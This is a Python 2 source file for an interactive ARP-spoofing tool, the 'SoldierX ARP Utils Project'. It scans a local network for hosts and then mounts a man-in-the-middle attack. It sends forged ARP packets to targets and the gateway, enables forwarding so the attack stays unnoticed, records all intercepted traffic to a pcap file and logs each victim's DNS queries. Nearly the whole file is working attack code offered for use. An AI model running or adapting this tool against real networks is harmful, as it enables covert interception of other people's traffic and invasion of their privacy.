from socket import inet_aton, inet_ntoa
from time import sleep
import threading
import datetime
import logging
import struct
import signal
import Queue
import os

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
logging.getLogger("scapy.runtime").setLevel(logging.WARNING)

_banner_ = "SoldierX ARP Utils Project - Written by xAMNESIAx. Type 'help' for a short help message."

GREEN = '\033[01;32m'
BLUE = '\033[01;34m'
RED = '\033[01;31m'
END = '\033[0m'

ExitQueue = Queue.Queue(maxsize=1)


class ArpUtils(object):

    """
    Main class for ArpUtils.py. This houses all of the code necessary
    to parse user input, launch attacks, and perform any other functions
    necessary to facilitate sucessful ARP based attacks.
    """

    def __init__(self):

        # This structure stores information regarding attacks
        # And their options.

        self.attacks = [

            {
                'Number': 0,
                'Name': 'MITM',
                'Description': 'Redirect all network traffic to the router via this computer, '
                               'capturing data in the process.',

                'Object': self.ArpSpoof,

                'Options': {

                    'targets': {
                        'Name': 'Targets',
                        'Description': 'List of IP\'s to be targetted by attack.',
                        'ArrType': (str, 'ip'),
                        'Type': list,
                        'Value': []
                    },

                    'dnsutils': {
                        'Name': 'DNSUtils',
                        'Description': 'Perform operations based on DNS requests; such as phishing, logging, etc.',
                        'Type': bool,

                        'Options': {
                            'logdns': {
                                'Name': 'LogDNS',
                                'Description': 'Save DNS requests from each target IP in individual files.',
                                'Type': bool,

                                'Value': True

                            },

                            'printdns': {
                                'Name': 'PrintDNS',
                                'Description': 'Print DNS requests as they are sniffed.',
                                'Type': bool,

                                'Options': {
                                    'uniqueonly': {
                                        'Name': 'UniqueOnly',
                                        'Description': 'Only print each unique DNS request once per IP',
                                        'Type': bool,
                                        'IsChild': True,
                                        'Value': True

                                    }

                                },

                                'Value': False

                            }

                        },

                        'Value': True
                    },

                    'Iface': {
                        'Name': 'Iface',
                        'Description': 'Name of the interface you wish to use to send the packets.',
                        'Type': str,
                        'Value': 'eth0'
                    },

                    'Gateway': {
                        'Name': 'Gateway',
                        'Description': 'IP Address of the common gateway between you and your targets.',
                        'Type': str,
                        'Value': ''
                    },

                    'Path': {
                        'Name': 'Path',
                        'Description': 'Path in which attack related files are to be stored',
                        'Type': str,
                        'Value': None
                    },

                    'Pcap': {
                        'Name': 'Pcap',
                        'Description': 'File name for packet capture file.',
                        'Type': str,
                        'Value': None
                    }
                }
            }

        ]

        # The command_list dictionary stores information about commands
        # that the user enters, and also the object that should be called
        # when that command is issued. It also contains a brief description
        # of the command, and the Index, which is used to specify the order
        # of printing when the 'help' command is used.

        self.command_list = {
            'perform': {
                'Name': 'Perform',
                'Object': self.__command_perform,
                'Description': 'Start the specified attack with the options set by the user',
                'Index': 4
            },

            'select': {
                'Name': 'Select',
                'Object': self.__command_select,
                'Description': 'Select an attack by numeric ID (for a list of attacks, type \'print attacks\')',

                'Index': 0
            },

            'clear': {
                'Name': 'Clear',
                'Object': self.__command_clear,
                'Description': 'Clear the screen',
                'Index': 5
            },

            'print': {
                'Name': 'Print',
                'Object': self.__command_print,
                'Description': 'Print variables stored in the struct to the screen (Variables can be specified'
                               ' directly, or using class notation (var.sub-var[...]))',

                'Index': 2
            },

            'help': {
                'Name': 'Help',
                'Object': self.__command_help,
                'Description': 'Print this dialogue',
                'Index': 6
            },

            'scan': {
                'Name': 'Scan',
                'Object': self.__command_scan,
                'Description': 'Scan the network using the specified gateway and interface',

                'Index': 3
            },

            'set': {
                'Name': 'Set',

                'Object': self.__command_set,
                'Description': 'Set variables in the attack struct. This can be done in many ways using many notations.'
                               ' Reference the README for more information on allowed notations for each data type',


                'Index': 1
            },

            'quit': {
                'Name': 'Quit',

                'Object': self.__command_quit,
                'Description': 'Exit the program',

                'Index': 7
            }
        }

        # Define variables for this class.#
        self.live_hosts = ''
        self.interface = ''
        self.selected = None
        self.gateway = ''
        self.attack = None
        self.iface = ''

        # Call main function of the class
        self.run()

    class ArpSpoof(object):

        """
        This class is responsible for facilitating the 'ARP Spoof' attack.
        This attack will utilise ARP Spoofing to make target computers
        alter their ARP table, mapping the attacker's MAC to the routers's
        internal IP Address, causing all traffic bound to the router, to
        be sent to this computer instead. The traffic will be recorded and
        forwarded to the router in order to stay undetected.
        """

        def __init__(self, attack, interface, gateway):
            self.attack = attack['Options']

            # Set date/time variables to the current date / time
            # so that PCAP files can be saved using a unique
            # filename.

            self.fnow = datetime.datetime.now().strftime('%d\%m\%y-%H-%M-%S')

            # If the user has not set a name for the capture file, set
            # it to 'capture.pcap'

            if self.attack['Options']['Pcap']['Value'] is None:
                self.attack['Options']['Pcap']['Value'] = 'capture.pcap'

            # If the user has not set a path for this attack session, set
            # it to 'ARP-SP-<DD>\<MM>\<YY>-<HH>:<MM>:<SS>'

            if self.attack['Options']['Path']['Value'] is None:
                self.attack['Options']['Path']['Value'] = 'ARP-SP-%s' % self.fnow

            # If the user has not created the directory pointed to by 'Path',
            # create it.

            if not os.path.exists(os.path.abspath(self.attack['Options']['Path']['Value'])):
                os.mkdir(os.path.abspath(self.attack['Options']['Path']['Value']))

            # Create temporary variables for 'Gateway' and 'Iface', so
            # that the values can be checked before being set to another
            # value.

            tgway = self.attack['Options']['Gateway']['Value']
            tiface = self.attack['Options']['Iface']['Value']

            # If temporary Iface, and temporary Gateway (set values),
            # are empty.

            if (tiface == '') and (tgway == ''):

                # And if interface and gateway passed to function are
                # not empty.

                if not ((interface == '') and (gateway == '')):

                    # Set 'Gateway' and 'Iface' to the values passed
                    # to the __init__() function.

                    self.attack['Options']['Gateway']['Value'] = gateway
                    self.attack['Options']['Iface']['Value'] = interface
                else:
                    raise Exception('Please set interface and gateway options using the set command.')

            self.run()

        class SniffPackets(threading.Thread):

            """
            This class is responsible for capturing and recording any packets
            that that reach the computer. It will also parse DNS queries using
            the filter_packets function, which will filter DNS queries out
            from the real-time data, and display them, provided that the correct
            options are set.
            """

            def __init__(self, attack):
                threading.Thread.__init__(self)

                # If OS is unix based, enable IPv4 packet forwarding.

                if os.name == 'posix':
                    with open('/proc/sys/net/ipv4/ip_forward', 'w') as handle:
                        handle.write('1')
                        handle.flush()
                    handle.close()

                self.attack = attack
                self.handle = None

            # This function of the SniffPackets class is responsible for
            # checking packets passed to if from the Sniff() function
            # in the calling function, and then checking it to see if
            # it contains headers that are of use to us. This function
            # relies on options set by the user in the attack struct.
            # Such as 'PrintDNS'.

            def filter_packets(self, pkt):

                options = self.attack['Options']['DNSUtils']['Options']
                path = self.attack['Options']['Path']['Value']

                # If user does not want to log DNS requests, return
                if not options['LogDNS']['Value']:
                    return

                # If packet has no IP layer, return
                if not pkt.haslayer('IP'):
                    return

                # Set 'ip' to the source IP of the packet
                # (Used for logging).

                ip = pkt.getlayer('IP').fields['src']

                # If the packet contains a DNS header, set 'qname' to
                # the hostname specified by the 'qd.qname' field, else
                # return.

                if pkt.haslayer(DNS) and (pkt.getlayer(DNS).qr == 0):
                    qname = pkt.getlayer(DNS).qd.qname
                else:
                    return

                # Has the user set 'PrintDNS' option to True.
                if options['LogDNS']['Options']['PrintDNS']['Value'] is True:

                    options = options['LogDNS']['Options']['PrintDNS']['Options']

                    # Should duplicate hostnames be printed, if not,
                    # check for presence in DNS log, else print without
                    # check.

                    if options['UniqueOnly']['Value'] is True:
                        with open(os.path.abspath('%s/%s' % (path, ip)), 'a+') as handle:

                            # Go through all lines in file checking for
                            # equality between qname and file line. If
                            # found, set hname_ocurrence to True, causing
                            # qname not to be printed; else print qname.

                            hname_ocurrence = False
                            for line in handle:
                                if line.split()[1] == qname:
                                    hname_ocurrence = True

                            if not hname_ocurrence:
                                print(qname)

                    else:
                        print(qname)

                # Get time and date for use in DNS log file.
                fnow = datetime.datetime.now().strftime('%d\%m\%y-%H-%M-%S')

                # Write to DNS log file.
                with open(os.path.abspath('%s/%s' % (path, ip)), 'a+') as handle:
                    handle.write('<%s> %s\n' % (fnow, qname))

                handle.close()

            # This function of the SniffPackets class is responsible for
            # creating a filter to be used by the Sniff() function of the
            # calling function, in order to filter packets specifically to
            # target data.

            @staticmethod
            def create_filter(gateway, targets):
                # Initialise filter_string
                filter_string = '('

                # Create rule for every target, to router from targets, and from
                # targets to router.

                for target in targets:
                    if targets.index(target) == len(targets) - 1:
                        filter_string += '((src %s) and (dst %s)) or ' % (target, gateway)
                        filter_string += '((src %s) and (dst %s))' % (gateway, target)
                    else:
                        filter_string += '((src %s) and (dst %s)) or ' % (target, gateway)
                        filter_string += '((src %s) and (dst %s)) or ' % (gateway, target)

                filter_string += ')'

                return filter_string

            def exit(self):
                self.handle.close()
                thread.exit_thread()

            # Main function of the SniffPackets class. This function
            # is responsible for the actual capturing, logging, and
            # parsing of the raw packet data.

            def run(self):

                # Add in checks to make sure that all required options have been set.

                path = os.path.abspath('%s/%s' % (self.attack['Options']['Path']['Value'],
                                                  self.attack['Options']['Pcap']['Value']))

                self.handle = PcapWriter(filename=path, append=True)
                pkt_filter = self.create_filter(self.attack['Options']['Gateway']['Value'],
                                                self.attack['Options']['Targets']['Value'])

                # While the thread is alive, append packets to the PCAP file, flushing the buffer
                # after each packet, to make sure that the file is constantly updated.

                while True:
                    if ExitQueue.full():
                        return

                    pkt = sniff(filter=pkt_filter, iface=self.attack['Options']['Iface']['Value'], count=1,
                                prn=self.filter_packets)

                    self.handle.write(pkt)
                    self.handle.flush()

                self.handle.close()

                print('Stopping attack.')
                return

        # Main function of the ArpSpoof class. This function
        # is responsible for spawning the SniffPackets thread,
        # and also for sending the crafted ARP packets to
        # selected targets.

        def run(self):
            sniffer_thread = self.SniffPackets(self.attack)  # Initialise SniffPackets thread.
            sniffer_thread.setDaemon(True)                   # Make sure thread is killed upon exit.
            sniffer_thread.start()                           # Start SniffPackets thread.

            # Send a crafted ARP packet every 5 seconds. This should be sufficient
            # to keep targets sending data through the attacking computer.

            try:
                while True:
                    if ExitQueue.full():
                        return

                    target_list = self.attack['Options']['Targets']['Value']

                    # For each target in the target list, create two malicious
                    # packets - one to be sent to the gateway, and one to be
                    # sent to the target, and send them to the respective
                    # destinations. Sleep 1 second, then repeat.

                    for target in target_list:
                        mal_packet_h = ARP(psrc=self.attack['Options']['Gateway']['Value'], pdst=target)
                        mal_packet_g = ARP(psrc=target, pdst=self.attack['Options']['Gateway']['Value'])

                        send(mal_packet_g, verbose=False)  # Send crafted ARP packet.
                        send(mal_packet_h, verbose=False)

                        sleep(1)  # Sleep for 5 seconds.

            except KeyboardInterrupt:
                sniffer_thread.exit()
                return

    # This function of the ArpUtils class is responsible for
    # selecting an attack to use.

    def __command_select(self, command):
        if len(command) < 1:
            raise Exception('Select command requires one argument. (select <id>)')

        if not command[0].isdigit():
            raise Exception('ID must be an integer.')

        command[0] = int(command[0])

        temp = []
        for attack in self.attacks:
            temp.append(command[0] == attack['Number'])

        if not any(temp):
            raise Exception('No attack with ID \'%d\'' % command[0])

        self.selected = command[0]
        self.attack = self.attacks[self.selected]

        #print('Attack with id \'%d\', selected (%s)' % (command[0], self.attack['Description']))
        self.attack['Options']['Gateway']['Value'] = self.gateway
        self.attack['Options']['Iface']['Value'] = self.iface

        return

    # This function of the ArpUtils class is responsible for
    # writing data to the attack struct

    def __command_set(self, command):
        if self.selected is None:
            raise Exception('%sSelect%s an %sattack%s before using the \'set\' command.' % (BLUE, END, GREEN, END))

        if len(command) < 2:
            raise Exception('Set command requires 2 arguments. (set <var> <val>)')

        options = self.attack['Options']

        if (command[0] in options) or (command[0].find('.') != -1):

            if command[0].find('.') != -1:
                temp = command[0].split('.')
                temp = map(lower, temp)

                #temp_attack = self.attack
                #temp_attack = temp_attack

                #temp_attack['Options'] = {'DNSUtils': self.attack['Options']['DNSUtils']}

                option = self.recursive_set(temp, self.attack)

            else:
                option = options[command[0]]

            if option['Type'] is bool:
                if command[1] == 'true':
                    option['Value'] = True

                elif command[1] == 'false':
                    option['Value'] = False

                else:
                    raise Exception('Input is not of the correct type (Boolean)')

                return

            # If the specified 'type' of the option is int
            elif option['Type'] is int:
                if not command[1].isdigit():
                    raise Exception('Input is not of the correct type (Intetger)')

                option['Value'] = command[1]

                return

            # If the specified 'type' of the option is list
            elif option['Type'] is list:
                arr_type, arr_info = option['ArrType']

                # If the list 'type' is integer
                if arr_type is int:
                    if arr_info == 'port':
                        if command[1].isdigit():
                            if command[1] not in range(1, 65536):
                                raise Exception('Integer \'%s\', is not in the port number range (1-65535)'
                                                % command[1])

                            option['Value'] = [command[1]]
                            print('%s list updated' % option['Name'])
                            return

                        elif command[1].find('-') != -1:
                            if command[1].find(',') != -1:
                                raise Exception('\'-\' and \',\' notations cannot be used in conjunction.')

                            val_range = command[1].split('-')

                            if len(val_range) != 2:
                                raise Exception('Too many values for \'-\' notation (exactly 2 required)')

                            if (not val_range[0].isdigit()) or (not val_range[1].isdigit()):
                                raise Exception('\'-\' notation can only accept decimal values.')

                            if val_range[0] > val_range[1]:
                                val_range.append(val_range.pop(0))

                            if (int(val_range[0]) in range(1, 65536)) and (int(val_range[1]) in range(1, 65536)):
                                self.attack['Value'] = range(val_range[0], val_range[1])
                                print('%s list updated' % option['Name'])
                                return

                            else:
                                raise Exception('Range \'%s\', contains values too large for a port number range'
                                                % command[1])

                        elif command[1].find(',') != -1:
                            port_list = command[1].split(',')

                            for port in port_list:
                                if not port.isdigit():
                                    raise Exception('\',\' notation can only accept decimal values.')

                                if (int(port) < 1) or (int(port) > 65535):
                                    raise Exception('Integer \'%d\', is not in the port number range (1-65535)'
                                                    % int(port))

                            option['Value'] = map(int, port_list)
                            print('\'%s\' list updated' % option['Name'])
                            return

                        else:
                            raise Exception('Input is not an integer or in a valid sequence notation (\'-\' / \',\')')

                # If the list 'type' is str
                elif arr_type == str:
                    if command[1].find(',') != -1:
                        target_list = []

                        if command[1].find('-') != -1:
                            raise Exception('Comma and Range notations cannot be used in conjunction.')

                        if command[1].find('/') != -1:
                            raise Exception('Comma and CIDR notations cannot be used in conjunction.')

                        str_list = command[1].split(',')

                        for l_str in str_list:
                            try:
                                inet_aton(l_str)
                            except socket.error:
                                continue

                            target_list.append(l_str)

                        option['Value'] = target_list

                    elif command[1].find('-') != -1:
                        if command[1].find('/') != -1:
                            raise Exception('Range and CIDR notations cannot be used in conjunction.')

                        try:
                            inet_aton(command[1].split('-')[0])
                        except socket.error:
                            raise Exception('Incorrect IP specified')

                        octets = command[1].split('.')
                        val_range = octets[3].split('-')

                        if len(val_range) != 2:
                            raise Exception('Too many values for Range notation (exactly 2 required)')

                        if (not val_range[0].isdigit()) or (not val_range[1].isdigit()):
                            raise Exception('Range notation can only accept decimal values.')

                        val_range = map(int, val_range)

                        if val_range[0] > val_range[1]:
                            val_range.append(val_range.pop(0))

                        if (val_range[0] in range(1, 256)) and (val_range[1] + 1 in range(1, 256)):
                            temp = []
                            for i in range(val_range[0], val_range[1] + 1):
                                temp.append('%s.%s.%s.%d' % (octets[0], octets[1], octets[2], i))

                            option['Value'] = temp
                            print('%s list updated' % option['Name'])
                            return

                        else:
                            raise Exception(
                                'Range \'%s\', contains values too large for an IP range' % command[1])

                    elif command[1].find('/') != -1:
                        try:
                            hosts = self.cidr_list(command[1])
                        except socket.error:
                            raise Exception('Supplied IP address was not correct')

                        option['Value'] = hosts

                    else:
                        try:
                            socket.inet_aton(command[1])
                        except socket.error:
                            raise Exception('Specified IP is invalid.')

                        option['Value'] = [command[1]]

            elif option['Type'] is str:
                option['Value'] = command[1]

        else:
            raise Exception('Option \'%s\', does not exist.' % command[0])

    # This function of the ArpUtils class is responsible for
    # printing data from the attack struct.

    def __command_print(self, command):

        if len(command) == 0:
            if self.selected != None:
                self.new_option_print(self.attack['Options'])
                return

            return

        if command[0] == 'attacks':
            for attack in self.attacks:
                print('%d   %s    %s\n' % (attack['Number'], attack['Name'], attack['Description']))

            return

        options = self.attack['Options']

        if command[0].find('.') != -1:
            temp = command[0].split('.')
            temp = map(lower, temp)

            if not len(temp) >= 2:
                raise Exception('Use of \'.\' must contain at least 2 options (a.b[.c])\n')

            if temp[0] in options:
                if 'Options' in options[temp[0]]:

                    if temp[1] in options[temp[0]]['Options']:
                        option = options[temp[0]]['Options'][temp[1]]

                        print('%s%s%s' % (BLUE, self.wrapped_list(option), END))

                    else:
                        raise Exception('No such option \'%s\'\n' % temp[1])

                else:
                    raise Exception('Option \'%s\' has no sub-options.\n' % temp[0])

            else:
                raise Exception('No such option \'%s\'\n' % temp[0])

        elif command[0] in options:
            print('%s%s%s' % (BLUE, self.wrapped_list(options[command[0]]), END))

    # This function of the ArpUtils class is responsible for
    # scanning the subnet for live hosts which can be
    # targeted.

    def __command_scan(self, *param):
        del param

        if self.selected is None:
            raise Exception('%sSelect%s an %sattack%s before using the \'scan\' command.' % (BLUE, END, GREEN, END))

        if self.attack['Options']['Gateway']['Value'] == '':
            raise Exception('%sSet%s a %sgateway%s before using the \'scan\' command.' % (BLUE, END, GREEN, END))

        if self.attack['Options']['Iface']['Value'] == '':
            raise Exception('%sSet%s an %sinterface%s before using the \'scan\' command.' % (BLUE, END, GREEN, END))

        try:
            self.live_hosts = self.scan(interface=self.iface, gateway=self.gateway)
        except Exception:
            self.live_hosts = self.scan()

    # This function of the ArpUtils class is responsible for
    # printing help about the ArpUtils.py to the screen.

    def __command_help(self, *param):
        del param

        i = 0
        while i < len(self.command_list):
            for key, command in self.command_list.iteritems():
                if command['Index'] == i:
                    print('\n%s%s%s\n%s' % (BLUE, command['Name'], END, command['Description']))
                    i += 1

    # This function of the ArpUtils class is responsible for
    # clearing the screen while using the program.

    @staticmethod
    def __command_clear(*param):
        del param

        if os.name == 'posix':
            os.system('clear')
        elif os.name == 'nt':
            os.system('cls')

    # This function of the ArpUtils class is responsible for
    # initialising the selected attack, with the specified
    # options.

    def __command_perform(self, attack, interface, gateway):
        if self.selected is None:
            raise Exception('%sSelect%s an %sattack%s before using the \'perform\' command.' % (BLUE, END, GREEN, END))

        self.attack['Object'].__call__(attack, interface, gateway)

    @staticmethod
    def __command_quit(*param):
        ExitQueue.put('EXIT')

    # This function of the ArpUtils class is responsible for
    # creating a 'wrapped list' from a list which is larger
    # than 6 elements long.

    @staticmethod
    def wrapped_list(option):
        if option['Type'] is list:
            if len(option['Value']) > 6:
                wrapped = '[%s, %s, ..., %s] (%d elements in total)' % (str(option['Value'][0]),
                                                                        str(option['Value'][1]),
                                                                        str(option['Value'][len(option['Value']) - 1]),
                                                                        len(option['Value']))

                return wrapped

        return option['Value']

    # This function of the ArpUtils class is responsible for turning
    # any CIDR formatted user input ([0-255].[0-255].[0-255].[0-255]/[24-32])
    # in to a list of addresses which represents the CIDR range in which
    # the user wants to target. E.g. if you were to pass the string
    # '192.168.0.0/24' to this function, it would return a list of
    # IP addresses with the last octet ranging from 2 - 254.
    # The integers 0, 1, and 255 are ommitted, as they are special
    # network addresses, and are not used by the DHCP under normal
    # circumstances.

    @staticmethod
    def cidr_list(cidr_str):
        ip, net_bits = cidr_str.split('/')
        ip_octets = ip.split('.')
        hosts = []

        if not net_bits.isdigit():
            raise Exception('CIDR bits section should be an integer')

        net_bits = int(net_bits)

        socket.inet_aton(ip)

        if net_bits < 24:
            net_bits = 24

        elif net_bits >= 32:
            return []

        host_bits = 32 - net_bits
        host_range = 2 ** host_bits

        for i in range(host_range - 1, (256 - host_range), -1):
            hosts.append('%s.%s.%s.%s' % (ip_octets[0],
                                          ip_octets[1],
                                          ip_octets[2],
                                          str(i)))

        return hosts

    # This function of the ARP Utils class is responsible for recursively
    # printing data pertaining to the options available for the user to
    # modify. It loops through each option in 'optlist', looking for more
    # nested 'Options' keys. If ones is found, it recursively calls itself
    # with a indentation level of tabbing + 1.

    def new_option_print(self, options):
        print('\nVariables:\n'
              '  Gateway: %s\n'
              '  Interface: %s\n'
              '  Path: %s\n'
              '  Pcap: %s\n\n'
              '  Targets:\n'
              '    %s' % (str(options['Gateway']['Value']),
                          str(options['Iface']['Value']),
                          str(options['Path']['Value']),
                          str(options['Pcap']['Value']),
                          str(self.wrapped_list(options['targets']))
                        ))

        print('\nOptions:\n')
        self.recursive_print(options, 1)

    def recursive_print(self, optlist, tabbing):
        if 'dnsutils' in optlist:
            optlist = {'dnsutils': optlist['dnsutils']}

        i = 0
        for key, option in optlist.iteritems():
            start = ''

            name = option['Name']

            if option['Type'] is bool:
                if option['Value'] is True:
                    name = '%s%s%s' % (GREEN, name, END)
                else:
                    name = '%s%s%s' % (RED, name, END)

            if tabbing > 1:
                start = '%s%s\\%s ' % ('  ' * (tabbing - 1), BLUE, END)
            else:
                start = '%s' % ('  ' * tabbing)

            if 'Options' in option:
                append = '%s%s|%s' % ('  ' * tabbing, BLUE, END)
            #elif tabbing > 1:
            #    append = '%s|' % ('  ' * (tabbing - 1))
            else:
                append = ''

            print('%s%s\n%s' % (start, name, append))

            if 'Options' in option:
                self.recursive_print(option['Options'], tabbing + 1)  # Recursively call own function with new values.

            i += 1
            #if tabbing == 0:
            #    print('__________________________________________________'
            #          '________________________________________')

    # This function of the ARP Utils class is responsible for parsing
    # the set command's class notation, recursing through the struct
    # before returning the option which is to be modified.

    def recursive_set(self, classlist, optlist):
        if classlist[0] in optlist['Options']:
            if len(classlist) > 1:
                if 'Options' in optlist:
                    optlist = self.recursive_set(classlist[1:], optlist['Options'][classlist[0]])
                    return optlist

                raise Exception('Sub-option \'%s\', does not exist.' % classlist[0])
            else:
                return optlist['Options'][classlist[0]]

        raise Exception('Sub-option \'%s\', does not exist.' % classlist[0])

    # This function of the ARP Utils class is responsible for creating a
    # table from the 'hosts' dictionary passed to it. It will make sure
    # that the data passes to it is represented in a nicely formatted
    # manner.

    @staticmethod
    def make_host_table(hosts):
        ip_list = []

        for host in hosts:
            ip_list.append(host['IP'])

        max_len = len(max(ip_list, key=len))

        print('No.   IP                 MAC')
        for host in hosts:
            print('%s%s%s%s%s' % (
                hosts.index(host),
                ' ' * (6 - len(str(hosts.index(host)))),
                host['IP'],
                ' ' * (8 + (max_len - len(host['IP']))),
                host['MAC']
            ))

    # This function of the ARP Utils class is responsible for enumerating
    # the /proc/net/route device file, in order to find out which interface
    # is currently being used the most, and what the gateway IP of that
    # interface is. This allows the automation of the target scan, which
    # scans the network for potential targets. If this fails, you will
    # be requested to set these values manually using the 'set' command.

    @staticmethod
    def get_gateway_and_iface():
        with open("/proc/net/route") as fh:
            for line in fh:
                fields = line.strip().split()
                if fields[1] != '00000000' or not int(fields[3], 16) & 2:
                    continue

                return fields[0], socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))

    # This function of the ARP Utils class is responsible for scanning
    # the network for online hosts, which the attacker can then
    # proceed to target

    def scan(self, gateway='', interface=''):

        if gateway == '':
            if self.attack['Options']['Gateway']['Value'] == '':
                raise Exception('Please set default gateway before scanning')
            else:
                gateway = self.attack['Options']['Gateway']['Value']

        if interface == '':
            if self.attack['Options']['Iface']['Value'] == '':
                raise Exception('Please set default interface before scanning')
            else:
                interface = self.attack['Options']['Iface']['Value']

        cidr_addr = '%s.%s.%s.0/24' % tuple(gateway.split('.')[0:3])
        live_hosts = []

        print('Scanning for hosts on network: \'%s\' (%s)\n' % (gateway, interface))
        ans, unans = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=cidr_addr),
                         timeout=4,
                         verbose=False,
                         iface=interface)

        for source, response in ans:
            if response.sprintf('%ARP.psrc%') != gateway:
                live_hosts.append({
                    'MAC': response.sprintf('%Ether.src%'),
                    'IP': response.sprintf('%ARP.psrc%')
                })

        if live_hosts == []:
            print('No hosts detected on network, other than you and the gateway. Exiting scan.')
            return

        self.make_host_table(live_hosts)

        return live_hosts

    # This function of the ARP Utils class is responsible for accepting
    # commands, and calling the appropriate functions to parse the data

    def run(self):
        print(_banner_)

        if os.name == 'posix':
            try:
                self.iface, self.gateway = self.get_gateway_and_iface()
            except:
                pass
                #print('Could not find default gateway. Do you have network access?')
                #return

            #self.live_hosts = self.scan(interface=self.iface, gateway=self.gateway)  # Removed at the request
                                                                                      # of Ogma until further
                                                                                      # notice.

        try:
            inet_aton(self.gateway)
        except socket.error:
            print('Error retrieving interface and gateway automatically, please set them manually.')

        signal.signal(signal.SIGINT, handler)

        while True:
            if ExitQueue.full():
                print('Exiting!')
                break
                
            try:
                if self.selected is None:
                    input_attack = '%sNONE%s' % (RED, END)
                else:
                    input_attack = '%s%s%s' % (GREEN, self.attack['Name'], END)

                uinput = raw_input('\n[%s]> ' % input_attack).split()

                if ExitQueue.full():
                    print('Exiting!')
                    break

                if uinput != []:
                    uinput = map(lower, uinput)

                    if uinput[0] == 'perform':
                        self.command_list[uinput[0]]['Object'].__call__(self.attack, self.iface, self.gateway)
                    else:
                        self.command_list[uinput[0]]['Object'].__call__(uinput[1:])

            except Exception as ex:
                pass


def lower(s):
    return s.lower()


def handler(*s):
    ExitQueue.put('EXIT')


if __name__ == '__main__':
    if os.geteuid() != 0:
        print('Please run ArpUtils as root!')
        exit(-1)

    ArpUtils()
